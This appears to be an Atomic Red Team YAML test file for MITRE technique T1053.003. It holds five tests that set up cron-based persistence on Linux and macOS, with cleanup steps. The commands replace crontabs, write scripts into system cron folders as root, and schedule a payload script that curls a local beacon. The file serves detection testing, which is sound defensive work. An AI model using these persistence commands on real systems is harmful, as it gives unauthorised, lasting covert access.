attack_technique: T1053.003
display_name: "Scheduled Task/Job: Cron"
atomic_tests:
- name: "Cron - Replace crontab with referenced file"
  description: |
    This test replaces the current user's crontab file with the contents of the referenced file. This technique was used by numerous IoT automated exploitation attacks.
  supported_platforms:
    - linux
    - macos
  executor:
    name: sh
    elevation_required: false
    command: |
      crontab -l > /tmp/notevil
      echo "* * * * * #{command}" > #{tmp_cron} && crontab #{tmp_cron}
    cleanup_command: |
      crontab /tmp/notevil
  input_arguments:
    command:
      description: Command to execute
      default: /tmp/evil.sh
      type: string
    tmp_cron:
      description: Temporary reference file to hold evil cron schedule
      default: /tmp/persistevil
      type: path
  auto_generated_guid: 435057fb-74b1-410e-9403-d81baf194f75

- name: "Cron - Add script to all cron subfolders"
  description: |
    This test adds a script to /etc/cron.hourly, /etc/cron.daily, /etc/cron.monthly and /etc/cron.weekly folders configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
  supported_platforms:
    - macos
    - linux
  executor:
    name: bash
    elevation_required: true
    command: |
      echo "#{command}" > /etc/cron.daily/#{cron_script_name}
      echo "#{command}" > /etc/cron.hourly/#{cron_script_name}
      echo "#{command}" > /etc/cron.monthly/#{cron_script_name}
      echo "#{command}" > /etc/cron.weekly/#{cron_script_name}
    cleanup_command: |
      rm /etc/cron.daily/#{cron_script_name} -f
      rm /etc/cron.hourly/#{cron_script_name} -f
      rm /etc/cron.monthly/#{cron_script_name} -f
      rm /etc/cron.weekly/#{cron_script_name} -f
  input_arguments:
    command:
      description: Command to execute
      default: "echo 'Hello from Atomic Red Team' > /tmp/atomic.log"
      type: string
    cron_script_name:
      description: Name of file to store in cron folder
      default: persistevil
      type: string
  auto_generated_guid: b7d42afa-9086-4c8a-b7b0-8ea3faa6ebb0

- name: "Cron - Add script to /etc/cron.d folder"
  description: |
    This test adds a script to /etc/cron.d folder configured to execute on a schedule.
  supported_platforms:
    - linux
  executor:
    name: sh
    elevation_required: true
    command: |
      echo "#{command}" > /etc/cron.d/#{cron_script_name}
    cleanup_command: |
      rm /etc/cron.d/#{cron_script_name} -f
  input_arguments:
    command:
      description: Command to execute
      default: "echo '*/5     *       *       *       *       root    echo \"Hello from Atomic Red Team\"' > /tmp/atomic.log"
      type: string
    cron_script_name:
      description: Name of file to store in cron folder
      default: persistevil
      type: string
  auto_generated_guid: 078e69eb-d9fb-450e-b9d0-2e118217c846

- name: "Cron - Add script to /var/spool/cron/crontabs/ folder"
  description: |
    This test adds a script to a /var/spool/cron/crontabs folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
  supported_platforms:
    - linux
  executor:
    name: bash
    elevation_required: true
    command: |
      echo "#{command}" >> /var/spool/cron/crontabs/#{cron_script_name}
    cleanup_command: |
      rm /var/spool/cron/crontabs/#{cron_script_name} -f
  input_arguments:
    command:
      description: Command to execute
      default: "echo 'Hello from Atomic Red Team' > /tmp/atomic.log"
      type: string
    cron_script_name:
      description: Name of file to store in /var/spool/cron/crontabs folder
      default: persistevil
      type: string
  auto_generated_guid: 2d943c18-e74a-44bf-936f-25ade6cccab4

- name: "Linux Cron Persistence - Install Cron and Create Suspicious Cron Job"
  description: |
    Installs cron if not present, then simulates APT39-style cron persistence by writing a cron job
    to /etc/cron.d/ that executes a bash payload via cron. Validates the full attack chain: crontab
    file creation followed by suspicious cron child process execution (bash, curl).
  supported_platforms:
    - linux
  input_arguments:
    cron_file:
      description: Path to the cron file to create
      default: /etc/cron.d/art_persistence
      type: path
    payload_file:
      description: Path to the payload script
      default: /tmp/art_cron_payload.sh
      type: path
  dependencies:
    - description: Cron must be installed
      prereq_command: which cron || which crond
      get_prereq_command: |
        if [ -f /etc/debian_version ]; then apt-get update && apt-get install -y cron; elif [ -f /etc/redhat-release ]; then yum install -y cronie; fi
  dependency_executor_name: bash
  executor:
    name: bash
    elevation_required: true
    command: |
      mkdir -p /etc/cron.d
      service cron start 2>/dev/null || service crond start 2>/dev/null || cron 2>/dev/null || crond 2>/dev/null
      cat > #{payload_file} <<'PAYLOAD'
      #!/bin/bash
      touch /tmp/art_cron_triggered
      curl -s http://127.0.0.1:9999/beacon 2>/dev/null || true
      PAYLOAD
      chmod +x #{payload_file}
      cat > #{cron_file} <<CRON
      * * * * * root #{payload_file}
      CRON
      sleep 65
      test -f /tmp/art_cron_triggered
    cleanup_command: |
      rm -f #{cron_file}
      rm -f #{payload_file}
      rm -f /tmp/art_cron_triggered
